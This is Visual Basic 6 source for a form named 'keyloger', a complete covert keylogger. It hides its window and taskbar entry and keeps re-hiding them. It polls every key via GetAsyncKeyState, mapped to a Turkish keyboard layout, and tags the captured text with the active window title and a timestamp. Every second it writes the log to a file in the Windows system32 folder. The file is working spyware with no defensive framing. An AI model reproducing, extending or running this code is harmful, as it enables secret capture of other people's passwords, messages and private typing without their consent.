VERSION 5.00
Begin VB.Form keyloger 
   Appearance      =   0  'Flat
   BackColor       =   &H80000005&
   BorderStyle     =   0  'None
   Caption         =   "Keylogger"
   ClientHeight    =   1110
   ClientLeft      =   22830
   ClientTop       =   4650
   ClientWidth     =   2715
   LinkTopic       =   "Form5"
   ScaleHeight     =   1110
   ScaleWidth      =   2715
   ShowInTaskbar   =   0   'False
   Begin VB.Timer Timer3 
      Interval        =   1
      Left            =   1080
      Top             =   600
   End
   Begin VB.TextBox Text2 
      Height          =   495
      Left            =   1320
      TabIndex        =   1
      Text            =   "c:\windows\system32\keyl.txt"
      Top             =   0
      Width           =   1215
   End
   Begin VB.TextBox Text1 
      Height          =   495
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   1215
   End
   Begin VB.Timer Timer2 
      Interval        =   1000
      Left            =   480
      Top             =   600
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   0
      Top             =   600
   End
End
Attribute VB_Name = "keyloger"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long

Private LastWindow As String
Private LastHandle As Long
Private dKey(255) As Long
Private Const VK_SHIFT = &H10
Private Const VK_CTRL = &H11
Private Const VK_ALT = &H12
Private Const VK_CAPITAL = &H14
Private ChangeChr(255) As String
Private AltDown As Boolean

Private Sub Form_Load()
Me.Hide
Me.Visible = False
App.TaskVisible = False

On Error Resume Next

ChangeChr(33) = "[PageUp]"
ChangeChr(34) = "[PageDown]"
ChangeChr(35) = "[End]"
ChangeChr(36) = "[Home]"

ChangeChr(45) = "[Insert]"
ChangeChr(46) = "[Delete]"

ChangeChr(48) = "="
ChangeChr(49) = "!"
ChangeChr(50) = "'"
ChangeChr(51) = "^"
ChangeChr(52) = "+"
ChangeChr(53) = "%"
ChangeChr(54) = "&"
ChangeChr(55) = "/"
ChangeChr(56) = "("
ChangeChr(57) = ")"

ChangeChr(186) = "þ"
ChangeChr(187) = "="
ChangeChr(188) = ","
ChangeChr(189) = "-"
ChangeChr(190) = "."
ChangeChr(191) = "ö"

ChangeChr(219) = "ð"
ChangeChr(220) = "ç"
ChangeChr(221) = "ü"
ChangeChr(222) = "i"


ChangeChr(86) = "Þ"
ChangeChr(87) = "+"
ChangeChr(88) = ";"
ChangeChr(89) = "_"
ChangeChr(90) = ":"
ChangeChr(91) = "?"

ChangeChr(119) = "Ð"
ChangeChr(120) = "Ç"
ChangeChr(121) = "Ü"
ChangeChr(122) = "Ý"


ChangeChr(96) = "0"
ChangeChr(97) = "1"
ChangeChr(98) = "2"
ChangeChr(99) = "3"
ChangeChr(100) = "4"
ChangeChr(101) = "5"
ChangeChr(102) = "6"
ChangeChr(103) = "7"
ChangeChr(104) = "8"
ChangeChr(105) = "9"
ChangeChr(106) = "*"
ChangeChr(107) = "+"
ChangeChr(109) = "-"
ChangeChr(110) = "."
ChangeChr(111) = "/"

ChangeChr(192) = """"
ChangeChr(92) = "é"
End Sub

Function TypeWindow()
Dim Handle As Long
Dim textlen As Long
Dim WindowText As String

Handle = GetForegroundWindow
LastHandle = Handle
textlen = GetWindowTextLength(Handle) + 1

WindowText = Space(textlen)
svar = GetWindowText(Handle, WindowText, textlen)
WindowText = Left(WindowText, Len(WindowText) - 1)

If WindowText <> LastWindow Then
If Text1 <> "" Then Text1 = Text1 & vbCrLf & vbCrLf
Text1 = Text1 & "====Tarih : " & DateTime.Now & "====" & vbCrLf & WindowText & vbCrLf & "==============================" & vbCrLf
LastWindow = WindowText
End If
End Function

Private Sub Timer1_Timer()

'when alt is up
If GetAsyncKeyState(VK_ALT) = 0 And AltDown = True Then
AltDown = False
Text1 = Text1 & ""
End If

'a-z A-Z
For i = Asc("A") To Asc("Z")
If GetAsyncKeyState(i) = -32767 Then
TypeWindow

If GetAsyncKeyState(VK_SHIFT) < 0 Then
If GetKeyState(VK_CAPITAL) > 0 Then
Text1 = Text1 & LCase(Chr(i))
Exit Sub
Else
Text1 = Text1 & UCase(Chr(i))
Exit Sub
End If
Else
If GetKeyState(VK_CAPITAL) > 0 Then
Text1 = Text1 & UCase(Chr(i))
Exit Sub
Else
Text1 = Text1 & LCase(Chr(i))
Exit Sub
End If
End If

End If
Next

'1234567890)(*&^%$#@!
For i = 48 To 57
If GetAsyncKeyState(i) = -32767 Then
TypeWindow

If GetAsyncKeyState(VK_SHIFT) < 0 Then
Text1 = Text1 & ChangeChr(i)
Exit Sub
Else
Text1 = Text1 & Chr(i)
Exit Sub
End If

End If
Next


';=,-./
For i = 186 To 192
If GetAsyncKeyState(i) = -32767 Then
TypeWindow

If GetAsyncKeyState(VK_SHIFT) < 0 Then
Text1 = Text1 & ChangeChr(i - 100)
Exit Sub
Else
Text1 = Text1 & ChangeChr(i)
Exit Sub
End If

End If
Next


'[\]'
For i = 219 To 222
If GetAsyncKeyState(i) = -32767 Then
TypeWindow

If GetAsyncKeyState(VK_SHIFT) < 0 Then
Text1 = Text1 & ChangeChr(i - 100)
Exit Sub
Else
Text1 = Text1 & ChangeChr(i)
Exit Sub
End If

End If
Next

'num pad
For i = 96 To 111
If GetAsyncKeyState(i) = -32767 Then
TypeWindow

If GetAsyncKeyState(VK_ALT) < 0 And AltDown = False Then
AltDown = True
Text1 = Text1 & ""
Else
If GetAsyncKeyState(VK_ALT) >= 0 And AltDown = True Then
AltDown = False
Text1 = Text1 & ""
End If
End If

Text1 = Text1 & ChangeChr(i)
Exit Sub
End If
Next

'for space
If GetAsyncKeyState(32) = -32767 Then
TypeWindow
Text1 = Text1 & " "
End If

'for enter
If GetAsyncKeyState(13) = -32767 Then
TypeWindow
Text1 = Text1 & vbCrLf
End If

'for backspace
If GetAsyncKeyState(8) = -32767 Then
TypeWindow
Text1 = Text1 & " "
End If

'for left arrow
If GetAsyncKeyState(37) = -32767 Then
TypeWindow
Text1 = Text1 & ""
End If

'for up arrow
If GetAsyncKeyState(38) = -32767 Then
TypeWindow
Text1 = Text1 & ""
End If

'for right arrow
If GetAsyncKeyState(39) = -32767 Then
TypeWindow
Text1 = Text1 & ""
End If

'for down arrow
If GetAsyncKeyState(40) = -32767 Then
TypeWindow
Text1 = Text1 & ""
End If

'tab
If GetAsyncKeyState(9) = -32767 Then
TypeWindow
Text1 = Text1 & " [Tab] "
End If

'escape
If GetAsyncKeyState(27) = -32767 Then
TypeWindow
Text1 = Text1 & " [Esc] "
End If

'insert, delete
For i = 45 To 46
If GetAsyncKeyState(i) = -32767 Then
TypeWindow
Text1 = Text1 & ChangeChr(i)
End If
Next

'page up, page down, end, home
For i = 33 To 36
If GetAsyncKeyState(i) = -32767 Then
TypeWindow
Text1 = Text1 & ChangeChr(i)
End If
Next

'left click
If GetAsyncKeyState(1) = -32767 Then
If (LastHandle = GetForegroundWindow) And LastHandle <> 0 Then
Text1 = Text1 & " "
End If
End If

End Sub




Private Sub Timer2_Timer()
On Error Resume Next


Text2.Text = "c:\windows\system32\keyl.txt"
Open Text2.Text For Output As #1
Print #1, Text1.Text;
Close #1
End Sub

Private Sub Timer3_Timer()
Me.Visible = False
Me.Hide
App.TaskVisible = False
End Sub
